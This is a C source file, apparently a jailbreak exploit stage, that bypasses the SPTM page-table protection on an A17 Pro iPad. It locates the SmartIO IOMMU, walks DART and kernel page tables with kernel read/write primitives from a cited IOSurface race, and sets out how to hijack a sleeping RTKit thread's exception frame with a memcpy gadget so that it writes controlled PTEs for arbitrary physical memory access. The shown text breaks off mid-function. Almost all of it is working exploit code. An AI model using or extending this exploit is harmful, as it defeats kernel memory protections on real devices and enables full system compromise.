/*
 * SmartIO SPTM Bypass — silentIO-style technique for A17 Pro
 * Educational jailbreak research only. For use on devices you own.
 *
 * Target: iPad Mini (iPad16,1), A17 Pro, iOS 27.0.1 (24A446)
 * SPTM: 820.0.22 (pre-DART parity fix, patched in 27.2 beta 3)
 * SmartIO firmware: RTKit_release-3514.0.15.release (ZERO PAC instructions)
 *
 * Technique: Use SmartIO coprocessor's RTKit firmware as an SPTM-unmediated
 * writer. SmartIO runs arm64 (not arm64e), has no PAC instructions, and its
 * DMA writes are not subject to SPTM page-table protection on iOS 27.0.1.
 *
 * The DART parity checking added in iOS 27.2 beta 3 blocks this class of
 * attack by verifying reference counts on IOMMU page-table entries.
 *
 * Prerequisites: kernel R/W from IOSurface race (CVE-2026-112477)
 *
 * Flow:
 * 1. Locate SmartIO DART (IOMMU) base and carveout region via IORegistry
 * 2. Create DART mapping: SmartIO IOvirt addr → AP page-table physical page
 *    (DART PTEs have no parity checking on 27.0.1, patched in 27.2b3)
 * 3. Find a sleeping RTKit thread's exception frame on the stack
 *    (thread struct +0x48 → frame ptr, frame is 0x350 bytes on stack)
 * 4. Arm the frame: set ELR_EL1 to _memcpy (0x87c8), set x0/x1/x2 for copy
 * 5. Wake the thread — RTKit scheduler restores frame via eret → memcpy runs
 * 6. memcpy writes controlled PTE bytes through DART → AP page-table page
 * 7. Self-referencing PTE enables arbitrary physical R/W from userspace
 *
 * References:
 * - silentIO (ddddddedcds): SmartIO SPTM bypass for iPhone 16 Pro / iOS 18.6.2
 * - Rocket (nvme0n1p): AGX-based SPTM bypass for iOS 17.0-17.3.1
 * - Titan (alfiecg24): SPTM bypass via AGX hibernation context
 * - ColdIntro (CVE-2022-32894): DCP-to-AP kernel write via coprocessor DMA
 * - iOS 27.0.1-27.2 patch analysis (Arch087146): DART parity fix details
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>

/* --- Kernel R/W primitives (from IOSurface exploit) --- */

extern uint64_t kread64(uint64_t addr);
extern uint32_t kread32(uint64_t addr);
extern void kwrite64(uint64_t addr, uint64_t val);
extern void kwrite32(uint64_t addr, uint32_t val);
extern void kread(uint64_t addr, void *buf, size_t len);
extern void kwrite(uint64_t addr, const void *buf, size_t len);
extern uint64_t kalloc(size_t size);
extern uint64_t kvtophys(uint64_t kva);  /* kernel VA → physical address */

/* --- SmartIO / RTKit constants --- */

/*
 * SmartIO DART (IOMMU) base address.
 * On A17 Pro (t8130), SmartIO's DART is at a fixed MMIO address.
 * This needs to be found from the device tree or by scanning IORegistry.
 *
 * The DART maps SmartIO's virtual addresses to physical addresses.
 * On iOS 27.0.1, DART page-table entries lack parity checking,
 * so we can create mappings to arbitrary physical pages.
 */
static uint64_t smartio_dart_base = 0;  /* Filled at runtime from IORegistry */

/*
 * SmartIO carveout: a region of physical memory reserved for SmartIO firmware.
 * The RTKit firmware, its heap, threads, and page tables live here.
 * We find it by reading the SmartIO device tree entry or DART translations.
 */
static uint64_t smartio_carveout_phys = 0;
static uint64_t smartio_carveout_size = 0;

/*
 * RTKit thread context frame layout.
 * When an RTKit thread sleeps, the scheduler saves its register state.
 * The frame includes: x0-x30, sp, pc, cpsr (at minimum).
 *
 * RTKit_release-3514.0.15 (from firmware disassembly, 2026-11-20):
 *
 * Thread struct: 0xB0 (176) bytes. Frame pointer at thread+0x48.
 * Thread list at VA 0x113560. Current threads at VA 0x1cfe0.
 *
 * TWO context formats exist:
 *
 * A) INITIAL CONTEXT BUFFER — set by RTK_thread_create for new threads:
 *   +0x00: x0 (first argument)
 *   +0x08: PC (entry point)
 *   +0xE8: magic 0x7777777777770077
 *   +0xF8: SP (aligned stack)
 *   +0x100: trampoline address (0xcfa4: br x1 → jumps to PC)
 *   +0x108: EL value (4=EL1h or 8=EL2h)
 *   +0x110: CPACR (0x300000)
 *   Size: 0x348 bytes
 *
 * B) EXCEPTION FRAME — saved to PERSISTENT CONTEXT BUFFER when thread sleeps:
 *   (SVC cooperative path saves via tpidrro_el0 → thread+0x48 buffer)
 *   +0x000: x0, x1    ← ATTACK: x0=memcpy dst, x1=memcpy src
 *   +0x010: x2, x3    ← ATTACK: x2=memcpy len
 *   +0x020: x4, x5
 *   +0x030: x6, x7
 *   +0x040: x8, x9
 *   +0x050: x10, x11
 *   +0x060: x12, x13
 *   +0x070: x14, x15
 *   +0x080: x16, x17
 *   +0x090: x18, x19
 *   +0x0A0: x20, x21
 *   +0x0B0: x22, x23
 *   +0x0C0: x24, x25
 *   +0x0D0: x26, x27
 *   +0x0E0: x28, x29
 *   +0x0F0: x30(LR), original_SP
 *   +0x100: ELR_EL1, SPSR_EL1  ← ATTACK: ELR = memcpy (0x87c8)
 *   +0x110: CPACR_EL1
 *   +0x118: FPSR, FPCR
 *   +0x128: q0-q31 (NEON, 512 bytes)
 *   +0x328: FAR_EL1, PAR_EL1
 *   +0x338: ESR_EL1 (32-bit)
 *   Size: 0x350 bytes (SVC save uses 0x348, IRQ save uses 0x350)
 *
 *   Restore path 1 (eret at 0x7d68): full thread switch via tpidrro_el0
 *   Restore path 2 (eret at 0x7ee4): return to same thread via SP
 *
 * Context switch mechanism: svc #0 (at 0xc778) → Sync exception →
 *   VBAR(0x1000)+0x200 handler → save all regs to stack → scheduler →
 *   pick next thread → restore regs from next thread's frame → eret
 */

/* Exception frame offsets (format B — sleeping threads) */
#define EXC_FRAME_X0        0x000
#define EXC_FRAME_X1        0x008
#define EXC_FRAME_X2        0x010
#define EXC_FRAME_X3        0x018
#define EXC_FRAME_LR        0x0F0  /* x30 */
#define EXC_FRAME_ORIG_SP   0x0F8
#define EXC_FRAME_ELR       0x100  /* return PC — the critical field */
#define EXC_FRAME_SPSR      0x108
#define EXC_FRAME_CPACR     0x110
#define EXC_FRAME_SIZE_SVC  0x348
#define EXC_FRAME_SIZE_IRQ  0x350

/* Initial context offsets (format A — new threads) */
#define RTK_CTX_X0_OFF      0x00
#define RTK_CTX_PC_OFF      0x08
#define RTK_CTX_MAGIC_OFF   0xE8
#define RTK_CTX_MAGIC_VAL   0x7777777777770077ULL
#define RTK_CTX_SP_OFF      0xF8
#define RTK_CTX_TRAMPOLINE  0x100
#define RTK_CTX_EL_OFF      0x108
#define RTK_CTX_CPACR_OFF   0x110
#define RTK_CTX_SIZE        0x348

/* Thread struct */
#define RTK_THREAD_FRAME_PTR 0x48
#define RTK_THREAD_SIZE     0xB0

/*
 * RTKSTACK watermark: the SmartIO firmware fills stack guard regions with
 * "RTKSTACKRTKSTACK..." (repeating 8-byte pattern 0x4B434154534B5452).
 * We use this to locate thread stacks and saved frames in the carveout.
 */
#define RTKSTACK_WATERMARK  0x4B434154534B5452ULL  /* "RTKSTACK" in LE */

/*
 * CONFIRMED gadget addresses from SmartIO firmware disassembly:
 *
 * _memcpy @ 0x87c8 (also _memmove, __platform_memmove)
 *   - Standard optimized memcpy with ldnp/stnp for large copies
 *   - Args: x0=dst, x1=src, x2=len
 *   - Returns to caller via saved x30 (LR)
 *
 * Infinite loop gadgets (b .):
 *   0x008c, 0x010c, 0x018c, 0x0200, 0x082c
 *   We use 0x082c as the LR parking address (closest to code section)
 *
 * ___bzero @ 0x8634 (also __platform_bzero, _bzero)
 * __platform_memset @ 0x86ac (_memset)
 */
#define SMARTIO_MEMCPY_VA   0x87c8
#define SMARTIO_INFLOOP_VA  0x082c
#define SMARTIO_BZERO_VA    0x8634
#define SMARTIO_MEMSET_VA   0x86ac

/* --- DART v3 manipulation (A15/A16/A17 Pro) --- */

/*
 * Apple DART v3 (Device Address Resolution Table) page table structure.
 *
 * DART v3 register layout (from hardware documentation + RE):
 *   0x000: DART_PARAMS1 — DART version and config
 *   0x004: DART_PARAMS2
 *   0x010: DART_ERROR_STATUS
 *   0x020: DART_TLB_OP — TLB invalidation trigger
 *   0x034: DART_TLB_OP_STATUS — TLB op completion
 *   0x040: DART_CONFIG — enable/disable, bypass
 *   0x060: DART_TCR(sid) — translation control per stream
 *   0x070: DART_TTBR(sid, idx) — base of L1 table per stream
 *   0x200+: stream-specific registers
 *
 * Two-level page tables:
 *   L1: 4KB pages of 64-bit pointers to L2 tables
 *   L2: 4KB pages of 64-bit PTEs → physical pages
 *
 * DART v3 PTE format:
 *   bit[0]      = valid
 *   bit[1]      = type (1=table for L1, 1=page for L2)
 *   bits[3:2]   = permissions (00=none, 01=R, 10=W, 11=RW) for L2
 *   bits[47:14] = physical address bits[47:14] (16KB aligned for DART v3)
 *   bits[47:12] = physical address bits[47:12] (4KB aligned for older DART)
 *
 * iOS 27.0.1 has NO parity checking on DART PTEs.
 * iOS 27.2 beta 3 adds iommu_read_refcnt parity checking.
 */

/* DART v3 register offsets */
#define DART_PARAMS1        0x000
#define DART_PARAMS2        0x004
#define DART_ERROR_STATUS   0x010
#define DART_TLB_OP         0x020
#define DART_TLB_OP_STATUS  0x034
#define DART_CONFIG         0x040
#define DART_TCR(sid)       (0x060 + (sid) * 4)
#define DART_TTBR(sid, idx) (0x070 + (sid) * 16 + (idx) * 4)

/* DART TLB invalidation commands */
#define DART_TLB_OP_FLUSH_ALL    0x00000001
#define DART_TLB_OP_FLUSH_STREAM 0x00000002
#define DART_TLB_OP_BUSY         0x00000004

/* DART PTE bits (v3 format) */
#define DART_PTE_VALID      0x3
#define DART_PTE_PERM_R     (1ULL << 2)
#define DART_PTE_PERM_W     (2ULL << 2)
#define DART_PTE_PERM_RW    (3ULL << 2)
/* Legacy compatibility defines */
#define DART_PTE_READ       DART_PTE_PERM_R
#define DART_PTE_WRITE      DART_PTE_PERM_W

/* DART page table geometry */
#define DART_PAGE_SIZE      0x4000   /* 16KB pages for DART v3 */
#define DART_PAGE_MASK      (DART_PAGE_SIZE - 1)
#define DART_L1_ENTRIES     (DART_PAGE_SIZE / 8)
#define DART_L2_ENTRIES     (DART_PAGE_SIZE / 8)
#define DART_L1_INDEX(va)   (((va) >> 25) & (DART_L1_ENTRIES - 1))
#define DART_L2_INDEX(va)   (((va) >> 14) & (DART_L2_ENTRIES - 1))

static uint64_t
dart_make_pte(uint64_t phys_addr, int permissions)
{
    return DART_PTE_VALID | permissions |
           (phys_addr & 0x0000FFFFFFFC0000ULL);  /* bits[47:14] for DART v3 */
}

/*
 * Discover SmartIO carveout by reading existing DART translations.
 * The first valid L2 PTE in stream 0 gives us the physical base.
 */
static uint64_t
dart_discover_carveout(void)
{
    fprintf(stderr, "[*] Discovering SmartIO carveout from DART L1/L2...\n");

    /* Read TTBR for stream 0 — this points to the L1 table */
    uint64_t ttbr_lo = kread32(smartio_dart_base + DART_TTBR(0, 0));
    uint64_t ttbr_hi = kread32(smartio_dart_base + DART_TTBR(0, 1));
    uint64_t l1_phys = ((ttbr_hi & 0xFFFF) << 32) | (ttbr_lo & 0xFFFFC000ULL);

    if (l1_phys == 0) {
        fprintf(stderr, "[-] DART TTBR is zero — stream not configured\n");
        return 0;
    }
    fprintf(stderr, "[+] DART stream 0 L1 table: phys 0x%llx\n", l1_phys);

    /* Walk L1 → L2 → find first valid PTE */
    uint64_t min_phys = UINT64_MAX;
    uint64_t max_phys = 0;

    for (int l1_idx = 0; l1_idx < 4; l1_idx++) {  /* Check first 4 L1 entries */
        uint64_t l1_entry = kread64(l1_phys + l1_idx * 8);
        if (!(l1_entry & DART_PTE_VALID))
            continue;

        uint64_t l2_phys = l1_entry & 0x0000FFFFFFFC0000ULL;
        for (int l2_idx = 0; l2_idx < 16; l2_idx++) {  /* Sample L2 entries */
            uint64_t l2_entry = kread64(l2_phys + l2_idx * 8);
            if (!(l2_entry & DART_PTE_VALID))
                continue;

            uint64_t page_phys = l2_entry & 0x0000FFFFFFFC0000ULL;
            if (page_phys < min_phys) min_phys = page_phys;
            if (page_phys > max_phys) max_phys = page_phys;
        }
    }

    if (min_phys == UINT64_MAX) {
        fprintf(stderr, "[-] No valid DART PTEs found\n");
        return 0;
    }

    fprintf(stderr, "[+] SmartIO physical range: 0x%llx - 0x%llx\n",
            min_phys, max_phys + DART_PAGE_SIZE);
    return min_phys;
}

/*
 * Flush the DART TLB so new mappings take effect immediately.
 */
static void
dart_flush_tlb(void)
{
    kwrite32(smartio_dart_base + DART_TLB_OP, DART_TLB_OP_FLUSH_ALL);

    /* Poll for completion — DART_TLB_OP_STATUS clears BUSY when done */
    for (int i = 0; i < 1000; i++) {
        uint32_t status = kread32(smartio_dart_base + DART_TLB_OP_STATUS);
        if (!(status & DART_TLB_OP_BUSY))
            return;
        usleep(10);
    }
    fprintf(stderr, "[!] DART TLB flush timed out\n");
}

/*
 * IORegistry class matching helpers.
 * We use IOKit userspace API to find the SmartIO DART service,
 * then read its properties for the MMIO base and carveout region.
 * This avoids complex kernel data structure traversal.
 */

static uint64_t
ioregistry_get_u64_prop(io_service_t service, const char *key)
{
    CFTypeRef prop = IORegistryEntryCreateCFProperty(
        service, CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8),
        kCFAllocatorDefault, 0);
    if (!prop) return 0;

    uint64_t val = 0;
    if (CFGetTypeID(prop) == CFNumberGetTypeID()) {
        CFNumberGetValue(prop, kCFNumberSInt64Type, &val);
    } else if (CFGetTypeID(prop) == CFDataGetTypeID()) {
        CFIndex len = CFDataGetLength(prop);
        if (len >= 8) {
            CFDataGetBytes(prop, CFRangeMake(0, 8), (UInt8 *)&val);
        } else if (len >= 4) {
            uint32_t val32 = 0;
            CFDataGetBytes(prop, CFRangeMake(0, 4), (UInt8 *)&val32);
            val = val32;
        }
    }
    CFRelease(prop);
    return val;
}

static int
find_smartio_dart(void)
{
    fprintf(stderr, "[*] Looking for SmartIO DART in IORegistry...\n");

    /*
     * Strategy: Use IOKit userspace API (available from app sandbox on iOS)
     * to match SmartIO DART and read its properties.
     *
     * The SmartIO DART appears under /arm-io in the IORegistry.
     * Service class names to try (varies by SoC generation):
     *   - "dart-smartio" (device tree compatible)
     *   - "AppleDARTSmartIO" (IOKit class)
     *   - "smartio" with parent DART
     *
     * Properties we need:
     *   - "reg" or "segment-ranges": DART MMIO physical address + size
     *   - "carveout-address" or "region-base": SmartIO carveout physical base
     *   - "carveout-size" or "region-size": SmartIO carveout size
     */

    /* Try matching by IOKit class name */
    static const char *dart_classes[] = {
        "AppleDARTSmartIO",
        "AppleSmartIODARTMapper",
        "dart,t8130",
        NULL
    };

    io_service_t dart_svc = IO_OBJECT_NULL;
    for (int i = 0; dart_classes[i] && dart_svc == IO_OBJECT_NULL; i++) {
        CFMutableDictionaryRef match = IOServiceMatching(dart_classes[i]);
        if (!match) continue;
        dart_svc = IOServiceGetMatchingService(kIOMasterPortDefault, match);
    }

    /* Fallback: iterate /arm-io children looking for "smartio" in name */
    if (dart_svc == IO_OBJECT_NULL) {
        io_iterator_t iter;
        io_service_t svc;
        CFMutableDictionaryRef match = IOServiceMatching("IOService");
        kern_return_t kr = IOServiceGetMatchingServices(kIOMasterPortDefault,
                                                         match, &iter);
        if (kr == KERN_SUCCESS) {
            while ((svc = IOIteratorNext(iter)) != IO_OBJECT_NULL) {
                io_name_t name;
                IORegistryEntryGetName(svc, name);
                if (strstr(name, "smartio") || strstr(name, "SmartIO")) {
                    /* Check if this is the DART (not the SmartIO device itself) */
                    io_name_t cls;
                    IOObjectGetClass(svc, cls);
                    if (strstr(cls, "DART") || strstr(cls, "dart")) {
                        dart_svc = svc;
                        break;
                    }
                    /* Also check parent for DART */
                    io_service_t parent;
                    if (IORegistryEntryGetParentEntry(svc, kIOServicePlane,
                                                      &parent) == KERN_SUCCESS) {
                        IORegistryEntryGetName(parent, name);
                        if (strstr(name, "dart")) {
                            dart_svc = parent;
                            IOObjectRelease(svc);
                            break;
                        }
                        IOObjectRelease(parent);
                    }
                }
                IOObjectRelease(svc);
            }
            IOObjectRelease(iter);
        }
    }

    if (dart_svc == IO_OBJECT_NULL) {
        fprintf(stderr, "[-] SmartIO DART service not found in IORegistry\n");
        fprintf(stderr, "    Falling back to kernel R/W device tree scan\n");
        return find_smartio_dart_kernel();
    }

    /* Read DART MMIO base from "reg" property */
    CFTypeRef reg_prop = IORegistryEntryCreateCFProperty(
        dart_svc,
        CFStringCreateWithCString(NULL, "reg", kCFStringEncodingUTF8),
        kCFAllocatorDefault, 0);
    if (reg_prop && CFGetTypeID(reg_prop) == CFDataGetTypeID()) {
        CFIndex len = CFDataGetLength(reg_prop);
        if (len >= 16) {
            uint64_t reg_pair[2];
            CFDataGetBytes(reg_prop, CFRangeMake(0, 16), (UInt8 *)reg_pair);
            smartio_dart_base = reg_pair[0];
            fprintf(stderr, "[+] SmartIO DART MMIO base: 0x%llx (size 0x%llx)\n",
                    reg_pair[0], reg_pair[1]);
        }
        CFRelease(reg_prop);
    }

    /* Read carveout from SmartIO parent or sibling node */
    smartio_carveout_phys = ioregistry_get_u64_prop(dart_svc, "carveout-address");
    if (!smartio_carveout_phys)
        smartio_carveout_phys = ioregistry_get_u64_prop(dart_svc, "region-base");
    smartio_carveout_size = ioregistry_get_u64_prop(dart_svc, "carveout-size");
    if (!smartio_carveout_size)
        smartio_carveout_size = ioregistry_get_u64_prop(dart_svc, "region-size");

    /* If carveout not on DART node, check the SmartIO device node */
    if (!smartio_carveout_phys) {
        io_service_t smartio_svc = IO_OBJECT_NULL;
        CFMutableDictionaryRef m = IOServiceMatching("AppleSmartIOASCWrap");
        if (!m) m = IOServiceMatching("AppleSmartIO");
        if (m) smartio_svc = IOServiceGetMatchingService(kIOMasterPortDefault, m);

        if (smartio_svc != IO_OBJECT_NULL) {
            smartio_carveout_phys = ioregistry_get_u64_prop(smartio_svc,
                                                            "carveout-address");
            if (!smartio_carveout_phys)
                smartio_carveout_phys = ioregistry_get_u64_prop(smartio_svc,
                                                                "region-base");
            smartio_carveout_size = ioregistry_get_u64_prop(smartio_svc,
                                                            "carveout-size");
            if (!smartio_carveout_size)
                smartio_carveout_size = ioregistry_get_u64_prop(smartio_svc,
                                                                "region-size");
            IOObjectRelease(smartio_svc);
        }
    }

    IOObjectRelease(dart_svc);

    if (!smartio_dart_base) {
        fprintf(stderr, "[-] DART MMIO base not found in properties\n");
        return find_smartio_dart_kernel();
    }
    if (!smartio_carveout_phys) {
        fprintf(stderr, "[-] SmartIO carveout address not found — will scan DART\n");
    }

    fprintf(stderr, "[+] SmartIO carveout: phys 0x%llx, size 0x%llx\n",
            smartio_carveout_phys, smartio_carveout_size);
    return 0;
}

/*
 * Fallback: find SmartIO DART by scanning device tree via kernel R/W.
 * The ADT (Apple Device Tree) is mapped in kernel memory. We walk it
 * looking for the smartio DART node.
 */
static int
find_smartio_dart_kernel(void)
{
    fprintf(stderr, "[*] Scanning device tree via kernel R/W...\n");

    /*
     * On A17 Pro (t8130), known SmartIO DART MMIO bases:
     * These are SoC-specific and can be confirmed from the device tree.
     * Common DART bases for A-series chips:
     *   A14: 0x235004000
     *   A15: 0x235004000 (same bus)
     *   A16: 0x235004000
     *   A17: 0x235004000 (expected, TBD from device tree)
     *
     * We'll attempt the known address and validate by reading the
     * DART identity register at offset 0x0.
     */

    static const uint64_t candidate_bases[] = {
        0x235004000ULL,  /* A14/A15/A16 SmartIO DART */
        0x235008000ULL,  /* alternate offset */
        0x239004000ULL,  /* alternate bus */
        0
    };

    for (int i = 0; candidate_bases[i]; i++) {
        uint64_t base = candidate_bases[i];
        /*
         * Read DART ID register. Valid DARTs have a recognizable ID.
         * DART v3 (A15+): offset 0x0 contains a version/ID field.
         */
        uint32_t dart_id = kread32(base);
        if (dart_id != 0 && dart_id != 0xFFFFFFFF) {
            fprintf(stderr, "[+] Candidate DART at 0x%llx, ID: 0x%x\n",
                    base, dart_id);
            smartio_dart_base = base;
            break;
        }
    }

    if (!smartio_dart_base) {
        fprintf(stderr, "[-] No DART found at known addresses\n");
        return -1;
    }

    /*
     * Find carveout by reading existing DART L1/L2 entries.
     * The first valid L2 PTE tells us the physical base of the
     * SmartIO firmware region.
     */
    if (!smartio_carveout_phys) {
        smartio_carveout_phys = dart_discover_carveout();
        smartio_carveout_size = 0x200000;  /* 2MB default, refine from DT */
    }

    return (smartio_dart_base != 0) ? 0 : -1;
}

/* --- RTKit thread frame manipulation --- */

/*
 * Scan the SmartIO carveout for RTKSTACK watermarks to find thread stacks.
 * Each thread's stack is bounded by watermark regions. The saved context
 * frame is typically at a known offset from the stack base.
 */
struct rtk_thread_info {
    uint64_t stack_base_phys;   /* Physical address of stack base */
    uint64_t frame_phys;        /* Physical address of saved frame */
    uint64_t saved_pc;          /* Current saved PC value */
    uint64_t saved_sp;          /* Current saved SP value */
    int is_sleeping;            /* Nonzero if thread is in sleep state */
};

#define MAX_THREADS 32

static int
find_sleeping_threads(struct rtk_thread_info *threads, int *count)
{
    *count = 0;

    /*
     * Two strategies to find sleeping thread exception frames:
     *
     * STRATEGY 1 (preferred): Read the RTKit thread list.
     *   _rtk_thread_list at SmartIO VA 0x113560 (zerofill section).
     *   _rtk_current_threads at SmartIO VA 0x1cfe0 (data section).
     *   Each thread struct is 0xB0 bytes. thread+0x48 = frame pointer.
     *   The frame pointer points to the exception frame on the thread's
     *   stack (set when the thread last went through svc/irq save).
     *   We access SmartIO memory via its MMIO mapping from the AP side.
     *   The carveout physical base + SmartIO VA gives the AP physical addr.
     *
     * STRATEGY 2 (fallback): Scan carveout for RTKSTACK watermarks.
     *   "RTKSTACK" (0x4B434154534B5452) is the stack guard pattern.
     *   Stacks grow downward; the exception frame is below the watermark.
     *   Less reliable but doesn't require knowing the thread list VA.
     */

    fprintf(stderr, "[*] Finding sleeping RTKit threads...\n");
    fprintf(stderr, "[*] Carveout: phys 0x%llx, size 0x%llx\n",
            smartio_carveout_phys, smartio_carveout_size);

    /* Strategy 1: Walk thread list */
    uint64_t thread_list_phys = smartio_carveout_phys + 0x113560;
    uint64_t current_threads_phys = smartio_carveout_phys + 0x1cfe0;

    for (int i = 0; i < MAX_THREADS && *count < MAX_THREADS; i++) {
        uint64_t thread_phys = thread_list_phys + (i * RTK_THREAD_SIZE);

        /* Read first word to check if thread entry is valid (non-zero) */
        uint64_t thread_word0 = kread64(thread_phys);
        if (thread_word0 == 0)
            continue;

        /* Read frame pointer from thread+0x48 */
        uint64_t frame_ptr = kread64(thread_phys + RTK_THREAD_FRAME_PTR);
        if (frame_ptr == 0 || frame_ptr < 0x200)
            continue;

        /*
         * frame_ptr is a SmartIO VA. Convert to AP physical:
         *   phys = carveout_base + smartio_va
         *
         * Read the saved ELR (return PC) from the exception frame.
         * A sleeping thread's ELR points into firmware code.
         */
        uint64_t frame_phys = smartio_carveout_phys + frame_ptr;
        uint64_t saved_elr = kread64(frame_phys + EXC_FRAME_ELR);

        /* Validate: ELR should be in SmartIO __TEXT (0x200..0x1c000) */
        if (saved_elr > 0x200 && saved_elr < 0x1c000) {
            uint64_t saved_x0 = kread64(frame_phys + EXC_FRAME_X0);
            uint64_t saved_sp = kread64(frame_phys + EXC_FRAME_ORIG_SP);

            threads[*count].stack_base_phys = frame_phys + EXC_FRAME_SIZE_SVC;
            threads[*count].frame_phys = frame_phys;
            threads[*count].saved_pc = saved_elr;
            threads[*count].saved_sp = saved_sp;
            threads[*count].is_sleeping = 1;
            (*count)++;

            fprintf(stderr, "[+] Thread %d: frame@phys:0x%llx ELR=0x%llx SP=0x%llx\n",
                    *count, frame_phys, saved_elr, saved_sp);
        }
    }

    /* Strategy 2 fallback: scan for RTKSTACK watermarks */
    if (*count == 0) {
        fprintf(stderr, "[*] Thread list scan found 0 — trying watermark scan...\n");

        uint64_t scan_end = smartio_carveout_phys + smartio_carveout_size;
        for (uint64_t addr = smartio_carveout_phys;
             addr < scan_end - 8 && *count < MAX_THREADS;
             addr += 0x1000)
        {
            uint64_t val = kread64(addr);
            if (val != RTKSTACK_WATERMARK)
                continue;
            if (kread64(addr + 8) != RTKSTACK_WATERMARK)
                continue;

            uint64_t frame_addr = addr - EXC_FRAME_SIZE_SVC;
            uint64_t saved_elr = kread64(frame_addr + EXC_FRAME_ELR);

            if (saved_elr > 0x200 && saved_elr < 0x1c000) {
                threads[*count].stack_base_phys = addr;
                threads[*count].frame_phys = frame_addr;
                threads[*count].saved_pc = saved_elr;
                threads[*count].saved_sp = kread64(frame_addr + EXC_FRAME_ORIG_SP);
                threads[*count].is_sleeping = 1;
                (*count)++;

                fprintf(stderr, "[+] Thread %d (watermark): frame@0x%llx ELR=0x%llx\n",
                        *count, frame_addr, saved_elr);
            }
        }
    }

    fprintf(stderr, "[*] Found %d candidate sleeping threads\n", *count);
    return (*count > 0) ? 0 : -1;
}

/* --- Page table manipulation --- */

/*
 * ARM64 page table entry format (4KB granule, 48-bit VA):
 *   bits[1:0]   = valid + type (0x3 = page, 0x1 = block)
 *   bits[47:12] = output address (physical page number << 12)
 *   bits[54:53] = access permissions
 *   bits[52]    = contiguous hint
 *   bits[11:2]  = lower attributes (AP, SH, AF, etc.)
 *
 * Self-referencing PTE: set a PTE's output address to point to its own
 * page-table page. This creates a "magic" virtual address that maps to
 * the page table itself, allowing arbitrary page table modification.
 */

#define PTE_VALID       0x3ULL
#define PTE_AF          (1ULL << 10)   /* Access Flag */
#define PTE_SH_ISH      (3ULL << 8)   /* Inner Shareable */
#define PTE_AP_RW       (0ULL << 6)   /* R/W at EL1, no access at EL0 */
#define PTE_ATTR_IDX(x) (((uint64_t)(x)) << 2)

static uint64_t
make_pte(uint64_t phys_addr, int writable)
{
    uint64_t pte = PTE_VALID | PTE_AF | PTE_SH_ISH | PTE_ATTR_IDX(0);
    pte |= (phys_addr & 0x0000FFFFFFFFF000ULL);
    if (!writable)
        pte |= (1ULL << 7);  /* AP[1] = read-only */
    return pte;
}

/* --- Main SPTM bypass flow --- */

/*
 * Phase 1: Locate target AP page-table page.
 *
 * We need to find a kernel page-table page that we want to modify.
 * With kernel R/W, we can read TTBR1_EL1 and walk the page tables
 * to find the L3 page that maps a chosen kernel virtual address.
 *
 * We'll target the page containing the trust cache runtime pointer,
 * so we can remap it to our controlled memory.
 */
/*
 * Walk ARM64 page tables (4KB granule, 48-bit VA, 4 levels).
 * Returns the PHYSICAL address of the L3 page-table page containing
 * the PTE for the given virtual address.
 *
 * On SPTM devices, TTBR1_EL1 is an EL2 register — we can't read it
 * directly. Instead, we find it from SPTM's pmap structures.
 *
 * ARM64 4KB granule VA layout (48-bit):
 *   L0 index: bits[47:39] (9 bits, 512 entries)
 *   L1 index: bits[38:30] (9 bits, 512 entries)
 *   L2 index: bits[29:21] (9 bits, 512 entries)
 *   L3 index: bits[20:12] (9 bits, 512 entries)
 *   Page offset: bits[11:0]
 */

#define PT_ENTRIES_PER_PAGE  512
#define PT_L0_SHIFT          39
#define PT_L1_SHIFT          30
#define PT_L2_SHIFT          21
#define PT_L3_SHIFT          12
#define PT_INDEX_MASK        0x1FF
#define PT_DESC_VALID        0x1
#define PT_DESC_TABLE        0x2
#define PT_DESC_ADDR_MASK    0x0000FFFFFFFFF000ULL

static uint64_t
walk_pagetables(uint64_t root_phys, uint64_t va)
{
    /* L0 */
    int l0_idx = (va >> PT_L0_SHIFT) & PT_INDEX_MASK;
    uint64_t l0_desc = kread64(root_phys + l0_idx * 8);
    if (!(l0_desc & PT_DESC_VALID)) return 0;
    uint64_t l1_phys = l0_desc & PT_DESC_ADDR_MASK;

    /* L1 */
    int l1_idx = (va >> PT_L1_SHIFT) & PT_INDEX_MASK;
    uint64_t l1_desc = kread64(l1_phys + l1_idx * 8);
    if (!(l1_desc & PT_DESC_VALID)) return 0;
    if (!(l1_desc & PT_DESC_TABLE)) return 0;  /* 1GB block, not table */
    uint64_t l2_phys = l1_desc & PT_DESC_ADDR_MASK;

    /* L2 */
    int l2_idx = (va >> PT_L2_SHIFT) & PT_INDEX_MASK;
    uint64_t l2_desc = kread64(l2_phys + l2_idx * 8);
    if (!(l2_desc & PT_DESC_VALID)) return 0;
    if (!(l2_desc & PT_DESC_TABLE)) return 0;  /* 2MB block, not table */
    uint64_t l3_phys = l2_desc & PT_DESC_ADDR_MASK;

    return l3_phys;  /* Physical address of L3 page-table page */
}

static uint64_t
find_target_pte_page(uint64_t kernel_base)
{
    fprintf(stderr, "[*] Finding target AP page-table page...\n");

    /*
     * On SPTM devices, the kernel page table root is managed by SPTM.
     * We find TTBR1 by reading from SPTM's pmap metadata.
     *
     * Approach: The kernel's pmap struct contains the page table root.
     *   kernel_pmap = *(uint64_t *)(kernel_base + kernel_pmap_offset)
     *   ttbr1_phys  = *(uint64_t *)(kernel_pmap + 0x0)  /* first field */
     *
     * On SPTM, pmap structs store the SPTM pmap handle. The actual
     * physical root can be obtained via:
     *   pmap->sptm_root = pmap+0x10 (physical address of L0 table)
     *
     * Alternative: scan for a known kernel text page's physical address
     * by looking through IOPhysicalMemoryDescriptor mappings, then walk
     * backwards to find L3.
     */

    /*
     * Try reading kernel_pmap. The offset varies by iOS version.
     * For iOS 27.0.1, search for the pmap pointer near bootstrap_text.
     *
     * kernel_pmap is typically at a fixed offset from __DATA_CONST.
     * We find it by pattern scanning the kernel data section.
     */
    uint64_t kernel_pmap_ptr = 0;

    /* Scan kernel data for pmap pointer — look for SPTM pmap magic */
    uint64_t data_base = kernel_base + 0x1000000;  /* ~16MB into kernel */
    for (uint64_t off = 0; off < 0x800000; off += 8) {
        uint64_t val = kread64(data_base + off);
        /*
         * kernel_pmap points to a structure where:
         *   +0x00: pmap flags/type
         *   +0x08: ASID
         *   +0x10: page table root (physical)
         *   The root should be a valid physical address (non-zero, aligned)
         */
        if (val > 0x800000000ULL && val < 0x1000000000ULL &&
            (val & 0xFFF) == 0) {
            /* Potential page table root — validate by reading L0[511] */
            uint64_t l0_last = kread64(val + 511 * 8);
            if (l0_last & PT_DESC_VALID) {
